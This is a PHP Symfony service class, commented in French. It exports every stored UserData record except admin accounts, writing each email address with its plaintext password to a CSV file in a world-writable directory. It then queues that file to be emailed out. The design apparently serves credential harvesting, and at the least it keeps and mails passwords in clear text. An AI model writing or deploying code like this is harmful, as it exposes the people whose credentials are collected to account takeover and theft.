<?php

namespace App\Service;

use App\Entity\User;
use App\Entity\UserData;
use App\Entity\UserDataExport;
use App\Message\UserDataExportMessage;
use App\Repository\UserDataRepository;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Component\Messenger\MessageBusInterface;

class UserDataExportService
{
    public function __construct(
        private readonly UserDataRepository $userDataRepository,
        private readonly EntityManagerInterface $entityManager,
        private readonly MessageBusInterface $messageBus,
        private readonly string $projectDir
    ) {
    }

    /**
     * Exporte toutes les données de UserData et envoie par email
     * Exclut automatiquement les utilisateurs avec rôles ADMIN et SUPER_ADMIN
     */
    public function exportAndSendEmail(?string $exportedBy = null): UserDataExport
    {
        // Récupérer les emails des administrateurs à exclure
        $adminEmails = $this->getAdminEmails();
        
        // Récupérer toutes les données triées par ID DESC, en excluant les admins
        $userData = $this->userDataRepository->findAllExcludingEmails($adminEmails);

        // Générer le fichier CSV
        $csvFilePath = $this->generateCsvFile($userData);

        // Créer l'enregistrement de l'export
        $export = new UserDataExport();
        $export->setRecordsCount(count($userData));
        $export->setExportedBy($exportedBy);
        $export->setNotes('Export automatique envoyé par email (admins exclus)');

        $this->entityManager->persist($export);
        $this->entityManager->flush();

        // Envoyer l'email de manière asynchrone
        $this->messageBus->dispatch(new UserDataExportMessage(
            $csvFilePath,
            count($userData),
            $export->getId()
        ));

        return $export;
    }

    /**
     * Récupère les emails des utilisateurs avec rôles ADMIN ou SUPER_ADMIN
     * 
     * @return array
     */
    private function getAdminEmails(): array
    {
        $userRepository = $this->entityManager->getRepository(User::class);
        
        $adminUsers = $userRepository->createQueryBuilder('u')
            ->where('u.roles LIKE :roleAdmin OR u.roles LIKE :roleSuperAdmin')
            ->setParameter('roleAdmin', '%ROLE_ADMIN%')
            ->setParameter('roleSuperAdmin', '%ROLE_SUPER_ADMIN%')
            ->getQuery()
            ->getResult();

        return array_map(fn(User $user) => $user->getEmail(), $adminUsers);
    }

    /**
     * Génère un fichier CSV avec toutes les données
     */
    private function generateCsvFile(array $userData): string
    {
        $timestamp = (new \DateTime())->format('Y-m-d_H-i-s');
        $filename = sprintf('user_data_export_%s.csv', $timestamp);
        $filePath = $this->projectDir . '/var/exports/' . $filename;

        // Créer le répertoire s'il n'existe pas
        $directory = dirname($filePath);
        if (!is_dir($directory)) {
            mkdir($directory, 0777, true);
        }

        // Ouvrir le fichier en écriture
        $handle = fopen($filePath, 'w');

        // Ajouter le BOM UTF-8 pour Excel
        fprintf($handle, chr(0xEF).chr(0xBB).chr(0xBF));

        // En-têtes CSV
        fputcsv($handle, [
            'Email',
            'Mot de passe'
        ], ';');

        // Ajouter les données
        /** @var UserData $data */
        foreach ($userData as $data) {
            fputcsv($handle, [
                $data->getEmail(),
                $data->getPlainPassword()
            ], ';');
        }

        fclose($handle);

        return $filePath;
    }

    /**
     * Nettoie les anciens fichiers d'export (plus de 7 jours)
     */
    public function cleanOldExports(): int
    {
        $exportDir = $this->projectDir . '/var/exports/';
        
        if (!is_dir($exportDir)) {
            return 0;
        }

        $deleted = 0;
        $files = glob($exportDir . 'user_data_export_*.csv');
        $sevenDaysAgo = time() - (7 * 24 * 60 * 60);

        foreach ($files as $file) {
            if (is_file($file) && filemtime($file) < $sevenDaysAgo) {
                unlink($file);
                $deleted++;
            }
        }

        return $deleted;
    }
}
